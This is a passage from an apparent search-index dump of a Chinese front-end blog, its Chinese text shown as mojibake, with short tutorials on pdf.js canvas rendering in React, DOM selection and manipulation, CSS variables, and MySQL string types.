å¼•å…¥å°ˆæ¡ˆä¸­çš„ pdf æª”import pdf from './assets/sample.pdf'function App() { GlobalWorkerOptions.workerSrc = workerSrc const canvas = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { renderPDF(pdf, 1).catch((error) =&gt; { console.log('error', error) }) }, []) // è®€å–æª”æ¡ˆçš„ function async function renderPDF(src: string, page: number) { const ctx = canvas.current!.getContext('2d')! // åˆ©ç”¨ getDocument ä¾†è®€å–æª”æ¡ˆ const doc = await getDocument(src).promise // æ‹¿åˆ°æª”æ¡ˆå¾Œï¼Œåˆ©ç”¨ getPage ä¾†å–å¾—é é¢è³‡è¨Š doc.getPage(page).then((page) =&gt; { // è¨­å®šç¸®æ”¾æ¯”ä¾‹ const viewport = page.getViewport({ scale: 1 }) // è¨­å®š cavas çš„å¯¬é«˜ canvas.current!.width = viewport.width canvas.current!.height = viewport.height // æ¸²æŸ“åˆ° canvas ä¸­ page.render({ canvasContext: ctx, viewport }) }) } return ( &lt;div className='App'&gt; &lt;div className='canvas-wrapper'&gt; &lt;canvas ref={canvas} id='canvas'&gt;&lt;/canvas&gt; &lt;/div&gt; &lt;div className='btns'&gt; &lt;button onClick={() =&gt; { // åˆ‡åˆ°ç¬¬ä¸€é  renderPDF(pdf, 1).catch((error) =&gt; { console.log('error', error) }) }} &gt; Prev &lt;/button&gt; &lt;button onClick={() =&gt; { // åˆ‡åˆ°ç¬¬äºŒé  renderPDF(pdf, 2).catch((error) =&gt; { console.log('error', error) }) }} &gt; Next &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} å¯¦éš›ç¯„ä¾‹å¯ä»¥åˆ° codesandbox ä¸Šåƒè€ƒï¼Œä¸éæˆ‘å¯¦åœ¨ä¸çŸ¥é“ç‚ºä»€éº¼ codesandbox ä¸Šæ²’è¾¦æ³•è®€å–åˆ° pdfjs çš„åŒ…â€¦ï¼Œæ‰€ä»¥åœ¨ç¯„ä¾‹ä¸­æ˜¯é€é cdn çš„æ–¹å¼ä¾†å¼•å…¥çš„ï¼Œé€™ä¸€é»é‚„è«‹è¦‹è«’ã€‚ è®€å–ä½¿ç”¨è€…ä¸Šå‚³çš„æª”æ¡ˆåœ¨å¤šæ•¸æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘æƒ³åšçš„é€šå¸¸æ˜¯è®“ä½¿ç”¨è€…è‡ªå·±ä¸Šå‚³æª”æ¡ˆä¸¦é¡¯ç¤ºåˆ°ç•«é¢ä¸Šã€‚å…¶å¯¦ä¸»è¦çš„é‚è¼¯éƒ½è·Ÿå‰›å‰›å·®ä¸å¤šï¼Œå°±æ˜¯æŠŠæª”æ¡ˆå…§å®¹ä¸Ÿçµ¦ pdfjs ä¾†è™•ç†ä¸¦ä¸”æ¸²æŸ“åˆ° canvas ä¸Šï¼Œä½†ç¾åœ¨è¦å¤šåšçš„ä¸€ä»¶äº‹æƒ…æ˜¯ï¼š å…ˆæŠŠä½¿ç”¨è€…ä¸Šå‚³çš„æª”æ¡ˆåšæ ¼å¼è½‰æ›å¾Œï¼Œå†ä¸Ÿçµ¦ pdfjs ä¾†è™•ç† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const canvas = useRef&lt;HTMLCanvasElement&gt;(null) // è®€å–æª”æ¡ˆçš„ function async function renderPDF(src: ArrayBuffer, pageIndex: number) { const ctx = canvas.current!.getContext('2d')! // åˆ©ç”¨ getDocument ä¾†è®€å–æª”æ¡ˆ const doc = await getDocument(src).promise // æ‹¿åˆ°æª”æ¡ˆå¾Œï¼Œåˆ©ç”¨ getPage ä¾†å–å¾—é é¢è³‡è¨Š doc.getPage(pageIndex).then((page) =&gt; { // è¨­å®šç¸®æ”¾æ¯”ä¾‹ const viewport = page.getViewport({ scale: 1 }) // è¨­å®š cavas çš„å¯¬é«˜ canvas.current!.width = viewport.width canvas.current!.height = viewport.height // æ¸²æŸ“åˆ° canvas ä¸­ const renderTask = page.render({ canvasContext: ctx, viewport }) renderTask.promise.catch(() =&gt; alert('render error')) }) } function onFileSelect(event: React.ChangeEvent&lt;HTMLInputElement&gt;) { const files = event.target.files! // ç¢ºèªæœ‰é¸æ“‡æª”æ¡ˆæ‰åšäº‹ if (files.length &gt; 0) { // new ä¸€å€‹ FileReader const fileReader = new FileReader() // ç”¨ FileReader ä¾†è®€å– blob fileReader.readAsArrayBuffer(files[0]) fileReader.onload = () =&gt; { // ä¸‹é¢é€™å…©æ®µæœƒåœ¨æ–‡ä¸­è§£é‡‹ï¼Œé€™é‚Šå…ˆçœ‹å€‹æ¦‚å¿µå°±å¥½äº† // new ä¸€å€‹ Uint8Array çš„ è¦–åœ–ï¼ˆviewï¼‰å‡ºä¾† const typedArray = new Uint8Array(fileReader.result as ArrayBuffer) // æŠŠ Uint8Array ä¸Ÿçµ¦ pdfjs ä¾†è™•ç†ï¼Œä¸¦æ¸²æŸ“åˆ° canvas ä¸Š renderPDF(typedArray, 1).catch((error) =&gt; console.log(error.message)) } } } return ( &lt;div className='App'&gt; &lt;div className='btns'&gt; &lt;input type='file' onChange={onFileSelect} /&gt; &lt;/div&gt; &lt;div className='canvas-wrapper'&gt; &lt;canvas ref={canvas} id='canvas'&gt;&lt;/canvas&gt; &lt;/div&gt; &lt;/div&gt; )} é™„è¨»ï¼šcodesandbox é—œæ–¼è®€æª”æ¡ˆçš„éƒ¨åˆ†å…¶å¯¦æœƒç‰½æ‰¯åˆ°è »å¤šæ±è¥¿çš„ï¼Œæ‰€ä»¥æˆ‘ä¸æ‰“ç®—è§£é‡‹å¤ªæ·±ï¼Œä½ åªè¦çŸ¥é“æ¯ä¸€æ­¥å¤§æ¦‚åœ¨åšä»€éº¼å°±å¥½äº†ï¼š ä½¿ç”¨è€…ä¸Šå‚³æª”æ¡ˆå¾Œï¼Œç”¨ event.target.files æ‹¿åˆ°çš„æœƒæ˜¯ã€Œblobã€æ ¼å¼çš„ç‰©ä»¶ï¼Œæˆ‘å€‘ä¸èƒ½ç›´æ¥æŠŠé€™å€‹ä¸Ÿçµ¦ pdfjs ä¾†è§£æï¼Œæ‰€ä»¥è¦å…ˆåšä¸€äº›è™•ç†ã€‚ åˆ©ç”¨ FileReader.readAsArrayBuffer ä¾†è®€å– blob å¾Œï¼Œæœƒæ‹¿åˆ°ä¸€å€‹ã€ŒArrayBufferã€çš„è³‡æ–™ã€‚ArrayBuffer æ˜¯ä¸€ç¨®æ¯”è¼ƒç‰¹åˆ¥çš„ç‰©ä»¶ï¼Œä»–çš„å…§å®¹æœƒæŒ‡å‘æŸå€‹è¨˜æ†¶é«”ä½å€ï¼ˆé¡ä¼¼ C çš„ Pointerï¼‰ï¼Œä½†é‡é»æ˜¯åªèƒ½è®€ä¸èƒ½å¯«ï¼Œæ‰€ä»¥å¿…é ˆåœ¨é€éä¸€å€‹å«åšã€ŒViewã€çš„ä¸€ç¨®è³‡æ–™å‹æ…‹ä¾†æ“ä½œ ArrayBufferï¼ˆé€™ä¸€æ®µçœŸçš„æ¯”è¼ƒæŠ½è±¡ï¼Œæ‰€ä»¥å¯èƒ½è¦å¤šåœ¨è‡ªå·±åƒè€ƒå…¶ä»–æ–‡ç« ä¾†æƒ³æƒ³çœ‹ï¼Œåƒ é€™ç¯‡ æˆ‘è¦ºå¾—è§£é‡‹å¾—é‚„è »å¥½ç†è§£çš„ï¼‰ã€‚ ç‚ºäº†é€é View ä¾†æ“ä½œ ArrayBufferï¼Œå¿…é ˆç”¨ new Uint8Array(fileReader.result as ArrayBuffer) ä¾†ç”¢ç”Ÿä¸€å€‹ Viewï¼Œè€Œ View åœ¨ JavaScript ä¸­æ˜¯å±¬æ–¼ä¸€ç¨®å«åšã€ŒTypedArrayã€çš„è³‡æ–™å‹æ…‹ï¼Œæ‰€ä»¥æ‰æœƒä»¥æ­¤ä¾†ç•¶ä½œè®Šæ•¸åç¨±ã€‚ æœ€å¾ŒæŠŠé€™å€‹ã€Œå¯æ“ä½œçš„è³‡æ–™ã€ä¸Ÿçµ¦ pdfjs å¾Œï¼Œå°±å¯ä»¥é †åˆ©çš„è®€å–ä¸¦æ¸²æŸ“åˆ° canvas ä¸Šã€‚ é›–ç„¶ä»¥é€™é‚Šçš„ä¾‹å­ä¾†èªªï¼Œå°±ç®—ä½ ç›´æ¥æŠŠ ArrayBuffer ä¸Ÿçµ¦ pdfjs ä¹Ÿå¯ä»¥æ­£å¸¸æ¸²æŸ“ï¼Œä½†å®˜æ–¹å»ºè­°é€éé€™ç¨®æ–¹å¼ä¾†æ¸›å°‘ã€Œmemory leakã€ çš„å•é¡Œã€‚","link":"/2022/11/19/canvas-render-pdf/"},{"title":"DOM å†·çŸ¥è­˜ï¼åœ¨ä¸€å€‹ç¯„åœå…§æ‰¾å‡ºå…ƒç´ ","text":"é€™å€‹çœŸçš„ä¸çŸ¥é“ã€‚ ç°¡è¿°åŸæœ¬ä»¥ç‚ºå…ƒç´ éƒ½åªèƒ½é€™æ¨£å­æ‰¾ï¼š 123456789101112131415&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt; JavaScriptï¼š 123456789const input1 = document.querySelectorAll('input[type=text]')[0]const input2 = document.querySelectorAll('input[type=text]')[1]const input3 = document.querySelectorAll('input[type=text]')[2]const input4 = document.querySelectorAll('input[type=text]')[3]console.log(input1)console.log(input2)console.log(input3)console.log(input4) å…¶å¯¦å¯ä»¥æŠŠç¯„åœç¸®å°é€™æ¨£å­åšå…¶å¯¦ä¹Ÿå¯ä»¥ï¼š 1234567// å–å¾—æ‰€æœ‰ .block å…ƒç´ const blocks = document.querySelectorAll('.block')// éæ­·æ¯å€‹ .block å…ƒç´ // ï¼ˆæ³¨æ„æ˜¯ Array-like-object æ‰€ä»¥æ‰èƒ½ç”¨ for..ofï¼‰for (let block of blocks) { console.log(block.querySelector('input[type=text]')) } é€™æ¨£å­çš„æœç´¢ç¯„åœå°±æœƒæ˜¯ï¼š blocks[0] ä¸‹é¢çš„ç¬¬ä¸€å€‹ &lt;input&gt; blocks[1] ä¸‹é¢çš„ç¬¬ä¸€å€‹ &lt;input&gt; blocks[2] ä¸‹é¢çš„ç¬¬ä¸€å€‹ &lt;input&gt; ä»¥æ­¤é¡æ¨ æ‰€ä»¥å…¶å¯¦ä½ å¹³å¸¸ç”¨ document.querySelector çš„æ„æ€æ˜¯ã€Œdocument ä¸‹é¢çš„ç¬¬ä¸€å€‹ &lt;input&gt;ã€ é€™æ˜¯ä¸€å€‹ä»”ç´°æƒ³æƒ³æœƒè¦ºå¾—å¾ˆåˆç†ï¼Œä½†å¹³å¸¸å»éƒ½æ²’ç™¼ç¾çš„äº‹æƒ…ï¼Œå¤ªæœ‰è¶£äº†ï¼","link":"/2022/01/20/catch-element-in-a-range/"},{"title":"ç”¨ DOM é¸åˆ°æƒ³è¦çš„å…ƒç´ ","text":"é¸æˆ‘é¸æˆ‘é¸æˆ‘ã€‚ åˆ—è¡¨å‚™è¨»ï¼š HTMLCollection å’Œ NodeList éƒ½æ˜¯ array-like-object æ³¨æ„ Element æœ‰ S è·Ÿæ²’æœ‰ S çš„å·®åˆ¥ï¼Œæœ‰ S é€šå¸¸ä»£è¡¨é™£åˆ—ï¼ˆå¤šå€‹çµæœï¼‰ getElementsByTagName(tagName) å›å‚³ã€Œé™£åˆ—ã€çµæœ 12const element = document.getElementsByTagName('div')console.log(element) // HTMLCollection(2)&nbsp;[div, div] getElementById(id) å›å‚³ã€Œç¯€é»ã€ï¼ˆid åªæœƒæœ‰ä¸€å€‹ï¼‰ 12const element = document.getElementById('yo')console.log(element) // &lt;div id=\"hi\"&gt;yoyoyo&lt;/div&gt; getElementsByClassName(className) å›å‚³ã€Œé™£åˆ—ã€çµæœ 12const element = document.getElementsByClassName('block')console.log(element) // HTMLCollection(2)&nbsp;[div.block, div.block] querySelector(selector) å›å‚³ç¬¬ä¸€å€‹æ‰¾åˆ°çš„ã€Œç¯€é»ã€ å‚™è¨»ï¼šæ³¨æ„åƒæ•¸æ˜¯ ã€Œcss selectorã€ 12const element = document.querySelector('.block')console.log(element) // &lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; querySelectorAll(selector) å›å‚³æ‰€æœ‰ç¬¦åˆçµæœçš„ã€Œé™£åˆ—ã€ å‚™è¨»ï¼šæ³¨æ„åƒæ•¸æ˜¯ ã€Œcss selectorã€ 12const element = document.querySelectorAll('.block')console.log(element) // NodeList(2)&nbsp;[div.block, div.block] element.childNodes å–å‡ºæ‰€æœ‰å­ç¯€é»ï¼ˆæ³¨æ„æ–‡å­—è·Ÿè¨»è§£ç¯€é»ï¼‰ 1234567&lt;div class=\"block\"&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt;&lt;/div&gt; 1234const parent = document.querySelector('.block')const childrens = parent.childNodesconsole.log(childrens)// NodeList(7)&nbsp;[text, p, comment, text, p, comment, text, p, text] element.firstChild å–å‡ºç¬¬ä¸€å€‹å­ç¯€é»ï¼ˆæ³¨æ„æ–‡å­—è·Ÿè¨»è§£ç¯€é»ï¼‰ 12345678&lt;div class=\"block\"&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt;&lt;/div&gt; 1234const parent = document.querySelector('.block')const commentNode = parent.firstChild // #textconst commentNode = parent.firstChild.nextSibling // #commentconst p = parent.firstChild.nextSibling.nextSibling.nextSibling // &lt;p&gt; element.firstElementChild å–å‡ºç¬¬ä¸€å€‹ã€Œå…ƒç´ ã€å­ç¯€é»ï¼ˆä¸æœƒé¸åˆ°æ–‡å­—æˆ–è¨»è§£ç¯€é»ï¼‰ 1234&lt;div id=\"foo\"&gt; &lt;!-- This comment won't be selected --&gt; &lt;span&gt;Hello&lt;/span&gt;&lt;/div&gt; 12console.log(document.getElementById('foo').firstElementChild)// &lt;span&gt;...&lt;/span&gt; element.lastElementChild å–å‡ºç¬¬ä¸€å€‹ã€Œå…ƒç´ ã€å­ç¯€é»ï¼ˆä¸æœƒé¸åˆ°æ–‡å­—æˆ–è¨»è§£ç¯€é»ï¼‰ 1234&lt;div id=\"foo\"&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 12console.log(document.getElementById('foo').lastElementChild)// &lt;p&gt;...&lt;/p&gt; element.closest(selector) æ‰¾åˆ°ã€Œä¸Šå±¤ç¬¬ä¸€å€‹ã€ç¬¦åˆé¸å–å™¨çš„çˆ¶å…ƒç´  123456&lt;ul&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 12const parent = document.querySelector('a').closest('li')console.log(parent) // ç¬¬ä¸€å€‹ &lt;li&gt; element.parentNode æ‰¾åˆ°çˆ¶å…ƒç´  12const parent = document.querySelectorAll('li')[3].parentNodeconsole.log(parent) // &lt;ul&gt; getElementsByName é€é name çš„å€¼ä¾†å–å¾—å…ƒç´ ï¼ˆé™£åˆ—ï¼‰ 12345678&lt;div class=\"block\"&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;input type=\"radio\" name=\"gender\" /&gt; &lt;input type=\"radio\" name=\"gender\" /&gt; &lt;input type=\"radio\" name=\"gender\" /&gt;&lt;/div&gt; 12console.log(document.getElementsByName('gender'))// NodeList(6)&nbsp;[p, p, p, input, input, input]","link":"/2022/01/18/catch-element-methods/"},{"title":"ç”¨ JavaScript æ”¹è®Š CSS çš„è®Šæ•¸","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°å…ˆå»ºç«‹å¥½ CSS è®Šæ•¸ï¼š 1234:root { --mouse-x: 0px; --mouse-y: 0px;} 12345.box { position: absolute; top: var(--mouse-y); left: var(--mouse-x);} 12345const root = document.documentElementroot.addEventListener('mousemove', (e) =&gt; { root.style.setProperty('--mouse-x', e.clientX + 'px') root.style.setProperty('--mouse-y', e.clientY + 'px')}) å°±é€™æ¨£å®Œæˆå›‰ï¼","link":"/2022/01/29/change-css-variable-value/"},{"title":"ç”¨ DOM æ”¹è®Šå…ƒç´ çš„ Class","text":"æ‡¶äººåŒ…ç³»åˆ—ã€‚ æ–°å¢æˆ–ç§»é™¤ ClassListå‚™è¨»ï¼šæ—¢ç„¶ classList éƒ½å« List äº†ï¼Œå°±ä»£è¡¨å¯ä»¥æƒ³æˆæ˜¯ä¸€å€‹é™£åˆ—ï¼Œä»–ä¸æœƒæŠŠæ•´ç­† Class è¦†å¯«æ‰ã€‚ æ–°å¢å–®å€‹HTMLï¼š 1&lt;div&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.getElementsByTagName('div')[0]element.classList.add('block') Outputï¼š 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; æ–°å¢å¤šå€‹HTMLï¼š 1&lt;div&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.getElementsByTagName('div')[0]element.classList.add('block', 'inline-block') Outputï¼š 1&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt; ç§»é™¤å–®å€‹HTMLï¼š 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')element.classList.remove('block') Outputï¼š 1&lt;div&gt;yoyoyo&lt;/div&gt; ç§»é™¤å¤šå€‹HTMLï¼š 1&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')element.classList.remove('inline-block', 'block') Outputï¼š 1&lt;div&gt;yoyoyo&lt;/div&gt; åˆ‡æ› ClassHTMLï¼š 12&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt;&lt;button&gt;Toggle Class&lt;/button&gt; JavaScriptï¼š 12345const element = document.querySelector('.block')document.querySelector('button').addEventListener('click', // æŒ‰ä¸‹æŒ‰éˆ•æ™‚ï¼Œåˆ‡æ› class () =&gt; element.classList.toggle('inline-block')) Outputï¼š æŠŠæ•´å€‹ Class è¦†å¯«æ‰ ClassNameæ‡‰è©²ä¸å¸¸ç”¨ï¼Œä½†å¯ä»¥çŸ¥é“ä¸€ä¸‹ã€‚ ç¯„ä¾‹ä¸€HTMLï¼š 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')element.className = 'override-backgroud' Outputï¼š 1&lt;div class=\"override-backgroud\"&gt;yoyoyo&lt;/div&gt; ç¯„ä¾‹äºŒ1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')element.className = 'block override-backgroud' Outputï¼š 1&lt;div class=\"block override-backgroud\"&gt;yoyoyo&lt;/div&gt;","link":"/2022/01/18/change-element-class/"},{"title":"ç”¨ DOM æ”¹è®Šå…ƒç´ å…§å®¹","text":"æ‡¶äººåŒ…ã€‚ å…ƒç´ ä¸­çš„æ‰€æœ‰æ–‡å­— innerTextå­˜å–æ–‡å­—å…§å®¹å‚™è¨»ï¼šåªæœƒé¡¯ç¤ºæ–‡å­—ï¼Œä¸åŒ…å«ã€Œæ¨™ç±¤ã€ HTMLï¼š 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block') // &lt;div class=\"block\"&gt;...&lt;/div&gt;console.log(element.innerText) // yoyoyo I am a span ä¿®æ”¹æ–‡å­—å…§å®¹å‚™è¨»ï¼šå¦‚æœå…§å®¹æœ‰ã€Œæ¨™ç±¤ã€çš„è©±æœƒè¢«è¦†å¯«æ‰ 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')element.innerText = 'blablablabla' Outputï¼š å…ƒç´ ä¸­çš„æ‰€æœ‰å…§å®¹ innerHTMLå‚™è¨»ï¼šæ‰€æœ‰å…§å®¹æŒ‡çš„å°±æ˜¯åŒ…å«ã€Œæ¨™ç±¤ã€ å­˜å–å…§å®¹HTMLï¼š 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')console.log(element.innerHTML) Outputï¼š 12yoyoyo&lt;span&gt;I am a span&lt;/span&gt; ä¿®æ”¹å…§å®¹HTMLï¼š 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12345const element = document.querySelector('.block')element.innerHTML = ` &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;` Outputï¼š 1234&lt;div class=\"block\"&gt; &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;&lt;/div&gt; åŒ…å«å…ƒç´ è‡ªå·±çš„æ‰€æœ‰å…§å®¹ outerHTMLå‚™è¨»ï¼šå°±è·Ÿ inner ä¸€æ¨£ï¼Œåªæ˜¯ç¾åœ¨é‚„åŒ…å«ã€Œå…ƒç´ è‡ªå·±ã€ å­˜å–å…§å®¹HTMLï¼š 1234&lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12const element = document.querySelector('.block')console.log(element.outerHTML) Outputï¼š 1234&lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; ä¿®æ”¹å…§å®¹å‚™è¨»ï¼šè¦ä¿®æ”¹çš„å…ƒç´ ä¸Šå±¤å¿…é ˆæœ‰ã€Œçˆ¶å…ƒç´ ã€æ‰å¯ä»¥ï¼Œä¸‹é¢èƒ½æ”¹æ˜¯å› ç‚ºåœ¨æ¸¬è©¦ç’°å¢ƒè£¡é¢ &lt;div&gt; çš„ä¸Šå±¤æœ‰ &lt;body&gt;ã€‚ HTMLï¼š 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScriptï¼š 12345const element = document.querySelector('.block')element.outerHTML = ` &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;` Outputï¼š 12&lt;span&gt;hehehe&lt;/span&gt;&lt;a href=\"#\"&gt;link&lt;/a&gt; æ¯” innerHTML æ•ˆèƒ½æ›´å¥½ä½†æ¯”è¼ƒé›£æ‡‚çš„ insertAdjacentHTMLæ³¨æ„ä¸€ä¸‹ç¬¬ä¸€å€‹åƒæ•¸æœ‰å››å€‹é¸é …ï¼š beforebegin å…ƒç´ çš„ä¹‹å‰ï¼ˆä¹‹å‰çš„ä¹‹å‰ï¼‰ aftereend å…ƒç´ çš„ä¹‹å¾Œï¼ˆä¹‹å¾Œçš„ä¹‹å¾Œï¼‰ afterbegin å…ƒç´ è£¡é¢çš„ç¬¬ä¸€å€‹ beforeend å…ƒç´ è£¡é¢çš„æœ€å¾Œä¸€å€‹ ï¼ˆå…¶å¯¦è‹±æ–‡æ„æ€æ¯”è¼ƒå¥½æ‡‚ï¼‰ 12345678910111213&lt;ul class=\"beforebegin\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"afterbegin\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt;&lt;/ul&gt; 12345678910// åœ¨é¸åˆ°çš„å…ƒç´ å‰é¢æ’å…¥ &lt;div&gt;document .querySelector('.beforebegin') .insertAdjacentHTML('beforebegin', '&lt;div&gt;Insert to outside&lt;/div&gt;')// åœ¨é¸åˆ°çš„å…ƒç´ ï¼ˆè£¡é¢ï¼‰çš„ç¬¬ä¸€å€‹æ’å…¥ &lt;li&gt;document .querySelector('.afterbegin') .insertAdjacentHTML('afterbegin', '&lt;li&gt;Insert to inside&lt;/li&gt;')","link":"/2022/01/18/change-element-content/"},{"title":"ç”¨ DOM æ”¹è®Šå…ƒç´ çš„ CSS","text":"å¯«ä¸‹ä¾†è¦æŸ¥æ¯”è¼ƒæ–¹ä¾¿ï¼Œæ€•ä»¥å¾Œåˆå¿˜äº†ã€‚ ç¤ºç¯„HTMLï¼š 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScriptï¼š 123456789const element = document.querySelector('.block')element.style.background = 'black'element.style.width = '500px'element.style.margin = '70px auto'element.style.padding = '30px'element.style.color = 'white'element.style.fontSize = '24px'element.style.fontFamily = 'sans-serif'element.style.textAlign = 'center' Outputï¼š å‚™è¨»ï¼šé€™äº›æ¨£å¼æœƒå¯«åˆ°ã€Œinline-styleã€ä¸­ ç‰¹åˆ¥æ³¨æ„åˆ° . å¾Œé¢çš„å±¬æ€§åç¨±ä¸èƒ½å‡ºç¾ -ï¼Œæ‰€ä»¥æœ‰ - çš„ CSS å±¬æ€§è¦æ”¹å¯«æˆ CamelCaseã€‚ ä½†ä½ çœŸçš„ç¡¬è¦çš„è©±é‚„æ˜¯å¯ä»¥ï¼Œåªæ˜¯è¦å¯«æˆé€™æ¨£ï¼š 12345678910const element = document.querySelector('.block')// æ”¹èƒŒæ™¯é¡è‰²element.style.background = 'black'element.style.width = '500px'element.style.margin = '70px auto'element.style.padding = '30px'element.style.color = 'white'element.style['font-size'] = '24px'element.style['font-faimily'] = 'sans-serif'element.style['text-align'] = 'center' ä¸éä¸å»ºè­°å•¦ï½å¾ˆé›£çœ‹è€¶ã€‚","link":"/2022/01/18/change-element-style/"},{"title":"CHARã€VARCHAR å’Œ TEXT çš„å·®ç•°","text":"æ‡¶äººåŒ…ç³»åˆ—ã€‚ æ‡¶äººåŒ…CHARï¼š è¨­å®šæ™‚å°±è¦çµ¦ä¸€å€‹å›ºå®šé•·åº¦ï¼ˆå¦‚æœå­˜çš„è³‡æ–™é•·åº¦ä¸å¤ æœƒè‡ªå‹•åŠ ä¸Šç©ºæ ¼ï¼‰ æœ€å¤§é•·åº¦æ˜¯ 255 VARCHARï¼š ç•¶é•·åº¦ â‰¤ 255 æ™‚æ‹¿ 1 byte ä¾†å­˜å­—ä¸²çš„é•·åº¦ï¼Œè¶…éå°±æ‹¿ 2 byte æœ€å¤§é•·åº¦æ˜¯ 65535ï¼Œå¯ä»¥è‡ªå·±åŠ ä¸Šé•·åº¦é™åˆ¶ï¼ˆç•¢ç«Ÿéƒ½æœ‰ var é€™å€‹å‰å¢œäº†ï¼‰ å­—ä¸²é•·åº¦å¿…é ˆåœ¨ 1~65535 ä¹‹é–“ï¼Œä¸å¯ä»¥æ˜¯ç©ºå€¼ æŸ¥è©¢é€Ÿåº¦æ¯”è¼ƒå¿« TEXTï¼š æœƒç”¨ 2 byte ä¾†å­˜å­—ä¸²çš„é•·åº¦ æœ€å¤§é•·åº¦æ˜¯ 65535ï¼Œä¸å¯ä»¥è‡ªå·±åŠ ä¸Šé•·åº¦é™åˆ¶ æŸ¥è©¢é€Ÿåº¦æ¯”è¼ƒæ…¢ ç°¡å–®ä¾†èªªï¼Œèƒ½ç”¨ VARCHAR å°±ç›¡é‡ç”¨ VARCHARï¼ŒTEXT æ¯”è¼ƒé©åˆç”¨åœ¨ä¸ç¢ºå®šè³‡æ–™æœ‰å¤šé•·çš„æ¬„ä½ã€‚","link":"/2022/02/10/char-varchar-and-text-difference/"},{"title":"æª¢æŸ¥ä¸€å€‹è®Šæ•¸å­˜ä¸å­˜åœ¨çš„æ­£ç¢ºæ–¹å¼","text":"çœŸç¥å¥‡ã€‚ ç°¡è¿°é€šå¸¸æœ‰äº›äººæœƒé€™æ¨£åšï¼š 123if (typeof a !== 'undefined') { console.log(a);} æœƒé€™æ¨£åšæ˜¯å› ç‚ºå¦‚æœç›´æ¥ if (a !== 'undefined') çš„è©±ç¨‹å¼æœƒæ›æ‰ï¼Œåƒè€ƒé€™ä¾‹å­ï¼š 12console.log(typeof a); // 'undefined'console.log(a) // Uncaught ReferenceError: a is not defined æ‰€ä»¥ä¸æƒ³è¦ç¨‹å¼æ›æ‰çš„è©±å°±èƒ½åˆ©ç”¨ typeof ä¾†æª¢æŸ¥ã€‚","link":"/2022/03/06/checking-if-a-variable-exists/"},{"title":"Chorme-devtool çš„å†·çŸ¥è­˜","text":"ç´”ç²¹åšä¸€é»ç°¡å–®çš„ç´€éŒ„ã€‚ è·Ÿ Network æœ‰é—œçš„è³‡è¨Šrequest header host =&gt; é€£åˆ°å“ªå€‹ç¶²åŸŸ refer =&gt; å¾å“ªé‚Šé€£éä¾†çš„ï¼Ÿï¼ˆä¸Šå€‹é é¢ï¼‰ accept =&gt; æ¥å—å“ªäº›æ ¼å¼çš„ response accept-language =&gt; 